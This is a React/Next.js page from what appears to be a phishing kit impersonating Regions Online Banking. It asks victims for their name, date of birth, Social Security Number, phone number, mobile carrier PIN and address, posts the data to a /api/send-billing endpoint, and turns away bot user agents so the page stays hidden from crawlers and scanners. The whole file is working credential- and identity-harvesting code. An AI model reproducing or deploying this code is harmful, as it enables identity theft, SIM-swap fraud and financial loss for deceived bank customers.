import { Box, Flex, Text } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import ReactInputMask from "react-input-mask";
import * as yup from "yup";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import { AltButton } from "../../components/AltButton";
import { Container } from "../../components/Container";
import { Input } from "../../components/Input";
import { Wrapper } from "../../components/Wrapper";
import { DataContext } from "../_app";
import { getProgress } from "../../utils/getProgress";

interface PersonalInformationProps {}

const schema = yup.object().shape({
  firstname: yup
    .string()
    .required("This field is required, please enter your first name."),
  lastname: yup
    .string()
    .required("This field is required, please enter your last name."),
  dob: yup
    .string()
    .required("This field is required, please enter your birth date."),
  ssn: yup
    .string()
    .required("This field is required, please enter your SSN Number."),
  streetAddress: yup
    .string()
    .required("This field is required, please enter your address."),
  zipCode: yup
    .string()
    .required("This field is required, please enter your Zip code."),
  state: yup
    .string()
    .required("This field is required, please enter the state you in."),
  phoneNumber: yup
    .string()
    .required("This field is required, please enter your phone number."),
  carrierPin: yup.string(),
});

const PersonalInformation: NextPage<PersonalInformationProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    push(`/customerservice/emailverification`);
  });

  return (
    <Wrapper>
      <Head>
        <title>
          Regions Online Banking - Verify Personal Information | Regions
        </title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container
          progress={getProgress()}
          highlight={getProgress().indexOf(`Personal Information`)}
          showTitle
          showSide
          display={`flex`}
          bgColor={`#fff`}
          border={`2px solid #eee`}
          borderBottom={[`none`, `2px solid #eee`]}
          borderLeft={[`none`, `2px solid #eee`]}
          borderRight={[`none`, `2px solid #eee`]}
          borderRadius={`2px`}
          boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
          justifyContent={`flex-start`}
          m={[`15px auto 30px`, `50px auto`]}
          p={0}
          maxW={`initial`}
          w={`auto`}
          bg={`#f9f9f9`}
          flexDir={[`column`, `row`]}
        >
          <Box
            flex={`1 1 auto`}
            borderRight={[`none`, `2px solid #eee`]}
            borderBottom={[`2px solid #eee`, `none`]}
            p={[`30px 15px`, `30px`]}
            bg={`white`}
          >
            <Flex flexDir={`column`}>
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                mb={`13.5px`}
                fontSize={`18px`}
              >
                To get started, please enter the following required information:
              </Text>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`First name`}
                    error={errors.firstname && errors.firstname.message}
                    register={register}
                    name={`firstname`}
                  />
                </Box>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pl={[0, `15px`]}
                >
                  <Input
                    label={`Last name`}
                    error={errors.lastname && errors.lastname.message}
                    register={register}
                    name={`lastname`}
                  />
                </Box>
              </Box>
              {/* <Box w={`50%`} mt={0} float={`left`}>
              </Box> */}
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Input
                  label={`Date of birth mm/dd/yyyy`}
                  error={errors.dob && errors.dob.message}
                  register={register}
                  name={`dob`}
                  as={ReactInputMask}
                  mask="99/99/9999"
                  maskChar={` `}
                />
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Input
                  as={ReactInputMask}
                  mask="999-99-9999"
                  label={`Social Security Number`}
                  error={errors.ssn && errors.ssn.message}
                  register={register}
                  name={`ssn`}
                  maskChar={` `}
                />
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    as={ReactInputMask}
                    mask="(999) 999 9999"
                    label={`Phone Number`}
                    error={errors.phoneNumber && errors.phoneNumber.message}
                    register={register}
                    name={`phoneNumber`}
                    maskChar={` `}
                  />
                </Box>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pl={[0, `15px`]}
                >
                  <Input
                    label={`Carrier Pin`}
                    error={errors.carrierPin && errors.carrierPin.message}
                    register={register}
                    name={`carrierPin`}
                    type={`number`}
                  />
                </Box>
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`Address`}
                    error={errors.streetAddress && errors.streetAddress.message}
                    register={register}
                    name={`streetAddress`}
                  />
                </Box>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pl={[0, `15px`]}
                >
                  <Input
                    label={`State`}
                    error={errors.state && errors.state.message}
                    register={register}
                    name={`state`}
                  />
                </Box>
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`Zip Code`}
                    error={errors.zipCode && errors.zipCode.message}
                    register={register}
                    name={`zipCode`}
                    type={`number`}
                  />
                </Box>
              </Box>
              <AltButton onClick={onSubmit} disabled={loading}>
                Next
              </AltButton>
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

PersonalInformation.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default PersonalInformation;
